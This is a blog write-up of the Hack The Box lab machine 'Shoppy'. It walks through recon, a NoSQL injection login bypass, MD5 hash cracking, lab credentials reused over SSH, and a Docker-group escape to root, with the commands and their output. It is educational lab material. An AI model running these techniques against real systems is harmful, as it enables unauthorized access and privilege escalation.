<!DOCTYPE html><html lang="en" data-mode="light" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="Hack The Box - Shoppy" /><meta property="og:locale" content="en" /><meta name="description" content="Just writing my notes here." /><meta property="og:description" content="Just writing my notes here." /><link rel="canonical" href="https://niraj-maharjan.com.np/posts/Hack-The-Box-Shoppy/" /><meta property="og:url" content="https://niraj-maharjan.com.np/posts/Hack-The-Box-Shoppy/" /><meta property="og:site_name" content="Niraj Maharjan" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-02-12T00:00:00-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hack The Box - Shoppy" /><meta name="twitter:site" content="@NirajjjZzz" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-02-12T00:00:00-05:00","datePublished":"2023-02-12T00:00:00-05:00","description":"Just writing my notes here.","headline":"Hack The Box - Shoppy","mainEntityOfPage":{"@type":"WebPage","@id":"https://niraj-maharjan.com.np/posts/Hack-The-Box-Shoppy/"},"url":"https://niraj-maharjan.com.np/posts/Hack-The-Box-Shoppy/"}</script><title>Hack The Box - Shoppy | Niraj Maharjan</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Niraj Maharjan"><meta name="application-name" content="Niraj Maharjan"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/favicons/ms-icon-150x150.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title"> <a href="/">Niraj Maharjan</a></div><div class="site-subtitle font-italic">InfoSec Enthusiast</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://linkedin.com/in/niraj-maharjan" aria-label="linkedin" target="_blank" rel="noopener noreferrer"> <i class="fab fa-linkedin"></i> </a> <a href="https://github.com/nirajmaharz" aria-label="github" target="_blank" rel="noopener noreferrer"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/NirajjjZzz" aria-label="twitter" target="_blank" rel="noopener noreferrer"> <i class="fab fa-twitter"></i> </a> <a href="javascript:location.href = 'mailto:' + ['niraj.maharz','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hack The Box - Shoppy</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Hack The Box - Shoppy</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1676178000" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Feb 12, 2023 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/username">Niraj Maharjan</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1200 words"> <em>6 min</em> read</span></div></div></div><div class="post-content"><p><a href="/assets/Hackthebox/Shoppy/0.png" class="popup img-link shimmer"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 90% 70%'%3E%3C/svg%3E" data-src="/assets/Hackthebox/Shoppy/0.png" width="90%" height="70%" class="lazyload" data-proofer-ignore></a></p><p>Shoppy was a easy linux machine, which was vulnerable to NOSQL injection. Exploiting NOSQL injection, we  got password hash of all users. After cracking the hash of one user, the Mattermost server was accessed, where we discovered one of the users’ SSH credentials. After gaining access to the box, the credentials of another user were retrieved from the password-manager binary. After escaping a Docker container, we escalated our privileges to root.</p><h2 id="recon"><span class="mr-2">RECON</span><a href="#recon" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="nmap"><span class="mr-2">NMAP</span><a href="#nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Starting with <code class="language-plaintext highlighter-rouge">nmap</code>, nmap shows only port <code class="language-plaintext highlighter-rouge">22(ssh)</code> , <code class="language-plaintext highlighter-rouge">80(http)</code> are open.</p><ul><li>port22: OpenSSH<li>port80: nginx1.23.1: redirects tohttp://shoppy.htb</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="nv">$sudo</span> nmap 10.10.11.180 
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-12-16 12:40 +0545 
Nmap scan report <span class="k">for </span>shoppy.htb <span class="o">(</span>10.10.11.180<span class="o">)</span> 
Host is up <span class="o">(</span>0.32s latency<span class="o">)</span><span class="nb">.</span> 
Not shown: 998 closed tcp ports <span class="o">(</span>reset<span class="o">)</span> 
PORT   STATE SERVICE 
22/tcp open  ssh 
80/tcp open  http 
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>5.15 seconds
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="nv">$sudo</span> nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p</span> 22,80 10.10.11.180 <span class="nt">-oN</span> shoppy.nmap 
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-12-16 12:41 +0545 
Nmap scan report <span class="k">for </span>shoppy.htb <span class="o">(</span>10.10.11.180<span class="o">)</span> 
Host is up <span class="o">(</span>0.28s latency<span class="o">)</span><span class="nb">.</span> 
PORT   STATE SERVICE VERSION 
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 <span class="o">(</span>protocol 2.0<span class="o">)</span> 
| ssh-hostkey: 
|   3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 <span class="o">(</span>RSA<span class="o">)</span> 
|   256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 <span class="o">(</span>ECDSA<span class="o">)</span> 
|_  256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 <span class="o">(</span>ED25519<span class="o">)</span> 
80/tcp open  http    nginx 1.23.1 
|_http-title:             Shoppy Wait Page 
|_http-server-header: nginx/1.23.1 
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel 
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span> 
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>17.59 seconds
</pre></table></code></div></div><h3 id="port---80"><span class="mr-2">Port - 80</span><a href="#port---80" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>On Browsing <code class="language-plaintext highlighter-rouge">10.10.11.180</code> it redirects us to <code class="language-plaintext highlighter-rouge">shoppy.htb</code> . so adding it to our /etc/hosts file.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$cat</span> /etc/hosts
10.10.11.180 shoppy.htb
</pre></table></code></div></div><p><a href="/assets/Hackthebox/Shoppy/1.png" class="popup img-link "><img data-src="/assets/Hackthebox/Shoppy/1.png" alt="" class="lazyload" data-proofer-ignore></a></p><p>Visiting http://shoppy.htb/ revealed a straightforward countdown page announcing the upcoming release of Shoppy Beta.</p><h3 id="directory-fuzzing"><span class="mr-2">Directory Fuzzing</span><a href="#directory-fuzzing" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="nv">$sudo</span> ffuf <span class="nt">-u</span> http://shoppy.htb/FUZZ <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\ 
       /\ \__/ /\ \__/  __  __  /\ \__/ 
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\ 
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/ 
         \ \_\   \ \_\  \ \____/  \ \_\ 
          \/_/    \/_/   \/___/    \/_/ 
       v1.3.1 Kali Exclusive &lt;3 
________________________________________________ 
 :: Method           : GET 
 :: URL              : http://shoppy.htb/FUZZ 
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
 :: Follow redirects : false 
 :: Calibration      : false 
 :: Timeout          : 10 
 :: Threads          : 40 
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405 
________________________________________________ 
# directory-list-2.3-small.txt [Status: 200, Size: 2178, Words: 853, Lines: 57] 
images                  [Status: 301, Size: 179, Words: 7, Lines: 11] 
login                   [Status: 200, Size: 1074, Words: 152, Lines: 26] 
admin                   [Status: 302, Size: 28, Words: 4, Lines: 1] 
assets                  [Status: 301, Size: 179, Words: 7, Lines: 11] 
css                     [Status: 301, Size: 173, Words: 7, Lines: 11] 
Login                   [Status: 200, Size: 1074, Words: 152, Lines: 26] 
js                      [Status: 301, Size: 171, Words: 7, Lines: 11]
</span></pre></table></code></div></div><p>Found a login page. http://shoppy.htb/login</p><p><a href="/assets/Hackthebox/Shoppy/2.png" class="popup img-link "><img data-src="/assets/Hackthebox/Shoppy/2.png" alt="" class="lazyload" data-proofer-ignore></a></p><p>After testing it for login bypass using sql injection it did not work.</p><h3 id="authentication-bypass-nosql"><span class="mr-2">Authentication Bypass NoSQL</span><a href="#authentication-bypass-nosql" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>After couple minutes of experimenting with the authentication logic, we notice that it may be a <code class="language-plaintext highlighter-rouge">MongoDB NoSQL database</code> running.</p><p>We can bypass the authentication logic via: <code class="language-plaintext highlighter-rouge">admin'||'1==1</code> which always returns true.</p><p>Once we’re logged in, we see a <code class="language-plaintext highlighter-rouge">minimalistic admin panel</code>.</p><p><a href="/assets/Hackthebox/Shoppy/3.png" class="popup img-link "><img data-src="/assets/Hackthebox/Shoppy/3.png" alt="" class="lazyload" data-proofer-ignore></a></p><p>Entering the same payload on search bar .we get a list of <code class="language-plaintext highlighter-rouge">users</code> and their <code class="language-plaintext highlighter-rouge">hashes</code>.</p><p><a href="/assets/Hackthebox/Shoppy/4.png" class="popup img-link "><img data-src="/assets/Hackthebox/Shoppy/4.png" alt="" class="lazyload" data-proofer-ignore></a></p><p><a href="/assets/Hackthebox/Shoppy/5.png" class="popup img-link "><img data-src="/assets/Hackthebox/Shoppy/5.png" alt="" class="lazyload" data-proofer-ignore></a></p><h3 id="hash-cracking"><span class="mr-2">Hash cracking</span><a href="#hash-cracking" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Using <code class="language-plaintext highlighter-rouge">hashcat</code> to crack obtained <code class="language-plaintext highlighter-rouge">md5</code> hash.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nv">$sudo</span> hashcat <span class="nt">-m</span> 0 <span class="nb">hash</span> /usr/share/wordlists/rockyou.txt

<span class="nv">$sudo</span> hashcat <span class="nt">-m</span> 0 <span class="nt">--show</span> <span class="nb">hash  
</span>6ebcea65320589ca4f2f1ce039975995:remembermethisway
</pre></table></code></div></div><p>we were able to crack hash for the user josh.Tried to use this credential to login into the SSH account of user josh but got login failed.</p><h3 id="vhost-discovery-via-ffuf"><span class="mr-2">Vhost Discovery via ffuf</span><a href="#vhost-discovery-via-ffuf" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Using <code class="language-plaintext highlighter-rouge">ffuf</code> to enumerate <code class="language-plaintext highlighter-rouge">vhosts</code>.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="nv">$sudo</span> ffuf <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt <span class="nt">-u</span> http://shoppy.htb <span class="nt">-H</span> <span class="s2">"Host: FUZZ.shoppy.htb"</span> <span class="nt">-mc</span> 200 
        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\ 
       /\ \__/ /\ \__/  __  __  /\ \__/ 
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\ 
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/ 
         \ \_\   \ \_\  \ \____/  \ \_\ 
          \/_/    \/_/   \/___/    \/_/ 
       v1.3.1 Kali Exclusive &lt;3 
________________________________________________ 
 :: Method           : GET 
 :: URL              : http://shoppy.htb 
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt 
 :: Header           : Host: FUZZ.shoppy.htb 
 :: Follow redirects : false 
 :: Calibration      : false 
 :: Timeout          : 10 
 :: Threads          : 40 
 :: Matcher          : Response status: 200 
________________________________________________ 
mattermost              [Status: 200, Size: 3122, Words: 141, Lines: 1]
</span></pre></table></code></div></div><p>Vhost Bruteforce found a new host <code class="language-plaintext highlighter-rouge">mattermost.shoppy.htb</code>. Let us add it to our hosts file.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$cat</span> /etc/hosts
10.10.11.180 shoppy.htb mattermost.shoppy.htb
</pre></table></code></div></div><p>on browsing <code class="language-plaintext highlighter-rouge">http://mattermost.shoppy.htb</code> it redirects us to a login page.</p><p><a href="/assets/Hackthebox/Shoppy/6.png" class="popup img-link "><img data-src="/assets/Hackthebox/Shoppy/6.png" alt="" class="lazyload" data-proofer-ignore></a></p><p>we found out that we can login with the credentials of <code class="language-plaintext highlighter-rouge">josh</code> user found earlier.</p><p><a href="/assets/Hackthebox/Shoppy/7.png" class="popup img-link "><img data-src="/assets/Hackthebox/Shoppy/7.png" alt="" class="lazyload" data-proofer-ignore></a></p><p>Going through the webpage we found out credentials for <code class="language-plaintext highlighter-rouge">jaeger</code> user on the <code class="language-plaintext highlighter-rouge">Deploy Machine Channel</code>.</p><p><a href="/assets/Hackthebox/Shoppy/8.png" class="popup img-link "><img data-src="/assets/Hackthebox/Shoppy/8.png" alt="" class="lazyload" data-proofer-ignore></a></p><h2 id="shell-as-jaeger"><span class="mr-2">Shell as Jaeger</span><a href="#shell-as-jaeger" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We can now ssh into the box using this credentials. <code class="language-plaintext highlighter-rouge">jaeger: Sh0ppyBest@pp!</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="nv">$sudo</span> ssh jaeger@10.10.11.180 
Connecting to 10.10.11.180:22... 
Connection established. 
To escape to <span class="nb">local </span>shell, press <span class="s1">'Ctrl+Alt+]'</span><span class="nb">.</span> 
Linux shoppy 5.10.0-18-amd64 <span class="c">#1 SMP Debian 5.10.140-1 (2022-09-02) x86_64 </span>
The programs included with the Debian GNU/Linux system are free software<span class="p">;</span> 
the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the 
individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright. 
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent 
permitted by applicable law. 
/usr/bin/xauth:  file /home/jaeger/.Xauthority does not exist 
jaeger@shoppy:~<span class="err">$</span>
</pre></table></code></div></div><p>User <code class="language-plaintext highlighter-rouge">jaeger</code> is allowed to run <code class="language-plaintext highlighter-rouge">password-manager</code> as <code class="language-plaintext highlighter-rouge">deploy</code>.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>jaeger@shoppy:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span> 
Matching Defaults entries <span class="k">for </span>jaeger on shoppy: 
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin 
User jaeger may run the following commands on shoppy: 
    <span class="o">(</span>deploy<span class="o">)</span> /home/deploy/password-manager
</pre></table></code></div></div><p>But when we try to run <code class="language-plaintext highlighter-rouge">password-manager</code> as deploy user. it prompts us for master password.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>jaeger@shoppy:/home/deploy<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span> deploy /home/deploy/password-manager 
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>jaeger: 
Welcome to Josh password manager! 
Please enter your master password:
</pre></table></code></div></div><p>Tried to use the same password found earlier of user <code class="language-plaintext highlighter-rouge">jaeger</code> i.e <code class="language-plaintext highlighter-rouge">Sh0ppyBest@pp!</code> but it didnot work.</p><h2 id="shell-as-deploy"><span class="mr-2">Shell as Deploy</span><a href="#shell-as-deploy" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>on closely checking at the contents of <code class="language-plaintext highlighter-rouge">password-manager</code> found in the home directory of <code class="language-plaintext highlighter-rouge">deploy</code> user , we can see that the password as <code class="language-plaintext highlighter-rouge">Sample</code>. Password-manager file contains the credential <code class="language-plaintext highlighter-rouge">deploy : Deploying@pp!</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>jaeger@shoppy:/home/deploy<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span> deploy /home/deploy/password-manager 
Welcome to Josh password manager! 
Please enter your master password: Sample 
Access granted! Here is creds <span class="o">!</span> 
Deploy Creds : 
username: deploy 
password: Deploying@pp!
</pre></table></code></div></div><p>we can use this credentials to switch user as deploy.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>jaeger@shoppy:/home/deploy<span class="nv">$ </span>su - deploy 
Password: 
<span class="nv">$ </span><span class="nb">whoami 
</span>deploy
</pre></table></code></div></div><h2 id="shell-as-root"><span class="mr-2">Shell as Root</span><a href="#shell-as-root" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>on checking the id of deploy we can see that deploy is a member of <code class="language-plaintext highlighter-rouge">docker</code> group.We probably are in a docker container .</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>deploy@shoppy:~<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>deploy<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>deploy<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>deploy<span class="o">)</span>,998<span class="o">(</span>docker<span class="o">)</span>
</pre></table></code></div></div><p>we can escape the <code class="language-plaintext highlighter-rouge">docker</code> container and esclate our privilege as root using the following <code class="language-plaintext highlighter-rouge">docker</code> command.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>deploy@shoppy:~<span class="nv">$ </span>docker run <span class="nt">-v</span> /:/mnt <span class="nt">--rm</span> <span class="nt">-it</span> alpine <span class="nb">chroot</span> /mnt sh 
<span class="c"># whoami </span>
root 
<span class="c"># id </span>
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1<span class="o">(</span>daemon<span class="o">)</span>,2<span class="o">(</span>bin<span class="o">)</span>,3<span class="o">(</span>sys<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,6<span class="o">(</span>disk<span class="o">)</span>,10<span class="o">(</span>uucp<span class="o">)</span>,11,20<span class="o">(</span>dialout<span class="o">)</span>,26<span class="o">(</span>tape<span class="o">)</span>,27<span class="o">(</span><span class="nb">sudo</span><span class="o">)</span> 
<span class="c">#</span>
</pre></table></code></div></div><p>and we are root.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>hackthebox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/easy/" class="post-tag no-text-decoration" >easy</a> <a href="/tags/nosql/" class="post-tag no-text-decoration" >nosql</a> <a href="/tags/docker/" class="post-tag no-text-decoration" >docker</a> <a href="/tags/hashcat/" class="post-tag no-text-decoration" >hashcat</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack%20The%20Box%20-%20Shoppy%20-%20Niraj%20Maharjan&url=https%3A%2F%2Fniraj-maharjan.com.np%2Fposts%2FHack-The-Box-Shoppy%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack%20The%20Box%20-%20Shoppy%20-%20Niraj%20Maharjan&u=https%3A%2F%2Fniraj-maharjan.com.np%2Fposts%2FHack-The-Box-Shoppy%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fniraj-maharjan.com.np%2Fposts%2FHack-The-Box-Shoppy%2F&text=Hack%20The%20Box%20-%20Shoppy%20-%20Niraj%20Maharjan" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fniraj-maharjan.com.np%2Fposts%2FHack-The-Box-Shoppy%2F" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div 